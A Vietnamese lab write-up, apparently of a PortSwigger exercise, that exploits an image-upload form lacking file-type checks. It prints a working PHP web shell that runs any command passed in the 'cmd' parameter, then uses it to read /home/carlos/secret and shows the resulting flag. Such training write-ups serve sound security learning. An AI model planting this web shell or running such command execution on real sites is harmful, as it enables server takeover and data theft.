<img width="1690" height="894" alt="image" src="https://github.com/user-attachments/assets/30185010-5a62-416c-8240-0749ecd2e1f4" /><img width="997" height="608" alt="image" src="https://github.com/user-attachments/assets/357ca7a3-b1fc-49bb-a753-3cd7b2f87f86" />

# Tổng quan
Đầu tiên sử dụng trang web như một người dùng bình thường với tài khoản `wiener` và mật khẩu  `peter`

Sau khi đăng nhập,ta thấy có chức năng upload ảnh và update ảnh đại diện

<img width="1672" height="885" alt="image" src="https://github.com/user-attachments/assets/73c51466-2fe2-4206-a207-b5b20f8a9906" />

Ta thử upload ảnh và xem thử nó xử lý như nào:

<img width="1678" height="896" alt="image" src="https://github.com/user-attachments/assets/e3d2a794-ac1f-44a6-bd66-1903af404846" />

Và sau khi click vào Upload thì ta thấy được đường dẫn file được lưu trữ sau khi upload ảnh

<img width="1687" height="889" alt="image" src="https://github.com/user-attachments/assets/59fc1b7f-f69b-40d7-96b1-9fedbe79b1ac" />

Nhưng nếu ta thử với một file bất kì ví dụ là file txt thì sao?

<img width="1667" height="886" alt="image" src="https://github.com/user-attachments/assets/084ac62e-a0df-4623-a073-7ad00f2e9338" />

Click Upload

<img width="1692" height="892" alt="image" src="https://github.com/user-attachments/assets/6fe004d7-5e8b-459f-ba54-0cbeaa7ff5d3" />

Vậy là Web không có cơ chế white list để chống upload file khác nên ta upload file .txt

=> File Upload Vuln

Mục tiêu của ta là đọc được nội dung `/home/carlos/secret`
# Khai thác

Ta thử upload file exploit.php có chứa code giúp thực thi cmd thì liệu có upload được?

File exploit.php:
```PHP
<html>

<body>
    <form method="GET" name="<?php echo basename($_SERVER['PHP_SELF']); ?>">
        <input type="TEXT" name="cmd" autofocus id="cmd" size="80">
        <input type="SUBMIT" value="Execute">
    </form>
    <pre>
<?php
    if(isset($_GET['cmd']))
    {
        system($_GET['cmd'] . ' 2>&1');
    }
   
?>
</pre>
</body>

</html>
```

<img width="1689" height="889" alt="image" src="https://github.com/user-attachments/assets/bd9321cd-4d56-44d9-a954-4b02b8753968" />

Vậy là upload thành công 

Tiếp theo ta truy cập vào file `exploit.php` bằng path files/avatars/exploit.php:

<img width="1699" height="971" alt="image" src="https://github.com/user-attachments/assets/d2476b26-6336-4e96-9b96-063395570579" />

Vậy là ta có thể RCE để đọc nội dung file mà ta muốn

Sử dụng Linux command sau để đọc nội dung target:

```
cat /home/carlos/secret
```

<img width="1690" height="894" alt="image" src="https://github.com/user-attachments/assets/952cddd2-de37-481e-9f3d-66b091375100" />

Execute ta được:

<img width="1688" height="896" alt="image" src="https://github.com/user-attachments/assets/f2195c27-07b9-4166-8b54-3016912144c7" />

=> Nội dung ta cần submit để solve lab là:`RO6zNP7UhR12XMJoJmTHwGOwFLOJ85aW` 
=> Việc còn lại của ta là submit để giải quyết lab

<img width="1667" height="894" alt="image" src="https://github.com/user-attachments/assets/b1ef1a17-08c0-4b38-be25-88d7aeaa9913" />

=> Solved!
